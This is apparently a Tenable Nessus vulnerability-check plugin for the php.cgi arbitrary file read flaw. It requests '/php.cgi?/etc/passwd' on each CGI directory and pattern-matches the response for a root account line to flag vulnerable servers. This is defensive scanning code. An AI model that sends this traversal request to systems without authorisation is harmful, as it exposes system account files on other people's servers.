#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10177);
 script_version ("$Revision: 1.31 $");
 script_cve_id("CVE-1999-0238");
 script_bugtraq_id(2250);
 script_xref(name:"OSVDB", value:"137");
 script_name(english:"PHP/FI php.cgi Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be read on the remote server." );
 script_set_attribute(attribute:"description", value:
"'php.cgi' is installed. This CGI has a well known security flaw that 
lets an attacker read arbitrary files with the privileges of the HTTP
server." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Checks for the presence of /cgi-bin/php.cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  u = string(dir, "/php.cgi?/etc/passwd");
  r = http_send_recv3(method:"GET", item: u, port:port);
  if (isnull(r)) exit(0);
  buf = strcat(r[0], r[1], '\r\n', r[2]);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))
    security_warning(port, extra: strcat('The following URL will exhibit the flaw :\n\n', build_url(port: port, qs: u), '\n'));
}
